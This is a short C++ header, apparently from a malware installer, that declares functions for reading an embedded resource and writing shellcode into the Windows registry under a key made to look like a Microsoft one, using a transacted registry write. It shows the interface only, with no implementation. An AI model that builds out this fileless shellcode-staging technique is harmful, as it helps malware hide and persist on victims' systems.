#pragma once
#include "errors.hpp"
#include "handles.hpp"
#include <span>
#include <string_view>
#include <expected>

#define SHELLCODE_KEY LR"(SOFTWARE\Microsoft\)"

#ifndef LOADER_SHELLCODE_KEY
#error "installer must have LOADER_SHELLCODE_KEY set at compile-time"
#endif

#ifndef LOADER_SHELLCODE_VALUE
#error "installer must have LOADER_SHELLCODE_VALUE set at compile-time"
#endif

std::expected<std::span<std::byte>, common::windows_error>
read_resource(int id, HMODULE pe = nullptr);

std::expected<HANDLE, common::windows_error>
register_shellcode_transacted(
    HANDLE transaction,
    std::wstring_view key,
    std::wstring_view value,
    std::span<std::byte> data
);
